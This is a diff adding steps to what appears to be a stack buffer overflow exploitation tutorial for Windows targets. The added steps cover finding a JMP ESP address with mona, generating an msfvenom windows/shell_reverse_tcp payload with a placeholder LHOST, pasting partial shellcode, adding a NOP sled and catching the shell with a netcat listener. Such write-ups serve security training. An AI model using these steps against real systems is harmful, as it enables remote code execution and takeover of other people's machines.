@@ -94,6 +94,40 @@ We make note of all the badchars. We then generate a new bytearray in mona speci
 We rerurn immunity debugger and run exploit.py. We repeat badchars comparison until the results status returns "Unmodified" indicating that no more badchars exist.
 
 ==============================================================================================================
-Finding a Jump Point
+Finding a Jump Point => ESP
 ==============================================================================================================
+With the debugger running or crashed, we run the command !mona jmp -r esp -cpb "\x00" and include all the badchars identifed above.
+This command will find all jmp esp instructions with addresses that won't contain the badchars specified.
+We choose an address and update the retn value with this address entered in little endian format (backwards).
+Example if the address is \x0A\x01\x02\xAD we enter that as \xAD\x02\x01\x0A
+
+==============================================================================================================
+Generating a Payload
+==============================================================================================================
+We run the msfvenom command and exclude all the badchars as follows:
+
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+
+We then copy and paste the value of generated c payload into our payload like so:
+
+payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
+"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
+...
+"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
+"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
+
+==============================================================================================================
+Prepend NOPs
+==============================================================================================================
+It is most likely that encoder was used to generate the payload. We will need some space in memory to unpack the payload.
+We do this by setting the padding value to 16 or more. "No Operation" denoted as (\x90) bytes.
+And the command as:  padding = "\x90" * 16
+==============================================================================================================
+Final Step - Exploit!
+==============================================================================================================
+Having set the correct prefix, offset, return address, padding and payload, we can now setup a netcat reverse listener and run the exploit.
+===============================================================================================================
+
+
+
 
